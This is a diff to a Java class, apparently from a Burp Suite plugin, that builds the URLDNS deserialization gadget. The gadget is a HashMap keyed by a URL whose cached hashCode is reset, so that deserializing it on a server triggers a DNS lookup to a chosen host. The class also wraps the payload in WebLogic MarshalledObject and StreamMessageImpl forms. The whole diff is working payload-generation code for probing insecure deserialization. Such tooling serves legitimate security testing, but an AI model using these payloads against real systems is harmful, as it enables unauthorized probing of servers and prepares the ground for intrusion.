@@ -1,5 +1,6 @@
-package burp;
+package payloads;
 
+import burp.Utilities;
 import weblogic.corba.utils.MarshalledObject;
 import weblogic.jms.common.StreamMessageImpl;
 
@@ -14,14 +15,14 @@ import java.util.HashMap;
 
 public class URLDNS {
 
-    private static Object getObject(final String url) throws Exception {
+    public static Object getObject(final String url) throws Exception {
         URLStreamHandler handler = new SilentURLStreamHandler();
 
-        HashMap ht = new HashMap(); // HashMap that will contain the URL
-        URL u = new URL(null, url, handler); // URL to use as the Key
-        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+        HashMap ht = new HashMap();
+        URL u = new URL(null, url, handler);
+        ht.put(u, url);
 
-        Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+        Utilities.setFieldValue(u, "hashCode", -1);
 
         return ht;
     }
@@ -57,15 +58,16 @@ public class URLDNS {
         if (type.equalsIgnoreCase("marshall")) {
             objOut.writeObject(marshalledObject(getObject(url)));
         } else if (type.equalsIgnoreCase("streamMessageImpl")) {
-            byte[] origPayload = getPayloadBytes(url);
-            objOut.writeObject(streamMessageImpl(origPayload));
-        } else
+            objOut.writeObject(streamMessageImpl(getPayloadBytes(url)));
+        } else {
             objOut.writeObject(getObject(url));
+        }
         objOut.flush();
         objOut.close();
         return byteOut.toByteArray();
     }
 
+    // 避免在序列化时发送 DNS 请求
     static class SilentURLStreamHandler extends URLStreamHandler {
 
         protected URLConnection openConnection(URL u) throws IOException {
